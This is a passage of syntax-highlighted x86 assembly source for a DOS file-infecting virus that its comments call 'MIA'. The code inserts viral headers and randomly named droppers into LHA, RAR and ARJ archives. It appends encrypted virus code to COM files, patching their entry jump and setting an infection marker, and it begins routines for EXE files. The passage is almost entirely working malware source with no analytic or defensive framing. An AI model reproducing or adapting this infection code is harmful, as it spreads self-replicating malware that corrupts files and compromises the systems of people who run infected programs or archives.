 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc2">52h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RARName</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Rarphile</span><span class="sc0">               </span><span class="sc1">; Jump and process RAR archive</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Buffy</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc2">6Ch</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fleet</span><span class="sc0">        </span><span class="sc1">; DI points to MIA's ARJ header, filename field</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Process_ARJ</span><span class="sc0">            </span><span class="sc1">; Branch and process ARJ archive</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ This handles .LHA/.LZH/.PAK files ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Save dropper's CRC-16 on stack</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Filing</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Random_Name</span><span class="sc0">            </span><span class="sc1">; Generate random filename (with random length)</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Store value of CRC-16 just after filename</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4Dh</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                         </span><span class="sc1">; Set up some stuff...</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Head_3</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">                     </span><span class="sc1">; DI = total header size</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Filing</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Head_3</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">LHA_FNS</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">; AL = filename length</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RARType</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Method</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LHA_CRC</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Filing</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Head_3</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; AL = header subsize</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">clc</span><span class="sc0">
 </span><span class="sc5">setalc</span><span class="sc0">                        </span><span class="sc1">; Zero as initial value</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Method</span><span class="sc0">       </span><span class="sc1">; Now calculate header's checksum...</span><span class="sc0">

</span><span class="sc5">Checksum</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; He he he, Vecna said that this checksum's</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; funny, I think He's right. 8-)</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">Checksum</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Head_4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; Store header's checksum into its field</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Lseek to EOF - 1</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Head_3</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">RightWrite</span><span class="sc0">             </span><span class="sc1">; Write viral LHA/LZH/PAK header</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Tail</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirVxD</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VirEnd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirVxD</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Overdrop</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ This handles .RAR files ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Rarphile</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RAR_CRC</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RAR_CRC</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Random_Name</span><span class="sc0">            </span><span class="sc1">; Create new random name for dropper</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Head_5</span><span class="sc0">       </span><span class="sc1">; DI holds total size of RAR header</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Head_6</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">         </span><span class="sc1">; Store it into header</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">                     </span><span class="sc1">; Save on stack for later usage</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RARName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Head_5</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RAR_FNS</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">        </span><span class="sc1">; DI = size of dropper filename (no ASCIZ)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RARType</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RARName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RARType</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">CRC32</span><span class="sc0">                  </span><span class="sc1">; Calculate RAR header's CRC-32</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Head_5</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">; But RAR archiver just needs the lower 16-bit</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; CX = RAR header size</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Head_5</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">RightWrite</span><span class="sc0">             </span><span class="sc1">; Write RAR header</span><span class="sc0">

</span><span class="sc5">Tail</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Blackday</span><span class="sc0">               </span><span class="sc1">; Error?</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirVxD</span><span class="sc0">     </span><span class="sc1">; Virus length + dropper size</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Overdrop</span><span class="sc0">         </span><span class="sc1">; Now write the dropper into file</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ This handles .ARJ files ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Process_ARJ</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Buffy</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc2">04h</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Blackday</span><span class="sc0">               </span><span class="sc1">; Stop!! don't infect ARJ multi-volume archive!</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ARJ_CRC</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ARJ_CRC</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Random_Name</span><span class="sc0">            </span><span class="sc1">; Generate random name for dropper</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Put 2 nulls to terminate filename and comment</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Head_2</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                  </span><span class="sc1">; DI now holds basic size of ARJ header that</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Head_1</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">         </span><span class="sc1">; MIA has just been created.</span><span class="sc0">
                               
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">CRC32</span><span class="sc0">                  </span><span class="sc1">; Calculate CRC-32 of ARJ header</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Store low-word of header's CRC-32</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Store hi-word of header's CRC-32</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Put what?</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Marker</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">                     </span><span class="sc1">; DI = the total size of ARJ header that MIA</span><span class="sc0">
                               </span><span class="sc1">; has just created.</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0FFFCh</span><span class="sc0">              </span><span class="sc1">; Lseek to EOF - 4</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Marker</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">RightWrite</span><span class="sc0">             </span><span class="sc1">; Write ARJ header</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Blackday</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirVxD</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc5">Overdrop</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cwd</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                   
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">RightWrite</span><span class="sc0">             </span><span class="sc1">; Write the dropper into file</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Blackday</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Old_Time</span><span class="sc4">],</span><span class="sc2">0FEh</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Old_Time</span><span class="sc4">],</span><span class="sc2">1Eh</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Comedown</span><span class="sc0">

</span><span class="sc5">Blackday</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Giveback</span><span class="sc0">

</span><span class="sc5">Full_Disk</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; If the disk has insufficient space for</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">               </span><span class="sc1">; MIA to write the whole codes,</span><span class="sc0">
 </span><span class="sc6">les</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LowPos</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">; then MIA should truncate the file</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">Mingle</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Liveaid</span><span class="sc0">       
 
</span><span class="sc5">Impeach</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0008h</span><span class="sc0">               </span><span class="sc1">; Ha??</span><span class="sc0">
 </span><span class="sc6">jnbe</span><span class="sc0">   </span><span class="sc5">Mingle</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Exe_Check</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Exephile</span><span class="sc0">         
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">; Larger than 65,535 bytes? so it's invalid COM</span><span class="sc0">
 </span><span class="sc6">jnl</span><span class="sc0">    </span><span class="sc5">Mingle</span><span class="sc0">                 </span><span class="sc1">; exit if so</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">                </span><span class="sc1">; First instruction... a near JMP ?</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Comphile</span><span class="sc0">               </span><span class="sc1">; Bomb if not</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get 2nd word</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Finishing_Touch</span><span class="sc0">        </span><span class="sc1">; Infected? go out</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ This handles .COM files ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Comphile</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,-(</span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; 56,024 bytes?</span><span class="sc0">
 </span><span class="sc6">ja</span><span class="sc0">     </span><span class="sc5">Mingle</span><span class="sc0">                 </span><span class="sc1">; File is too big, bail out</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc0">                     </span><span class="sc1">; Add with PSP size</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">MultiFormer</span><span class="sc0">            </span><span class="sc1">; Encrypt and write virus to EOF</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc5">Crafty</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Full_Disk</span><span class="sc0">              </span><span class="sc1">; Jump if error or insufficient disk space</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Lseek_BOF</span><span class="sc0">              </span><span class="sc1">; Move R/W pointer to BOF</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirBeg</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0">  </span><span class="sc1">; Put a near JMP opcode</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Put a displacement</span><span class="sc0">
 </span><span class="sc6">neg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc0">                     
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">       </span><span class="sc1">; The fourth byte will be the infection marker</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                 </span><span class="sc1">; Write four bytes</span><span class="sc0">

</span><span class="sc5">Neat</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">Finishing_Touch</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Sick</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ This handles .EXE files ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Exephile</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Offensive</span><span class="sc0">             
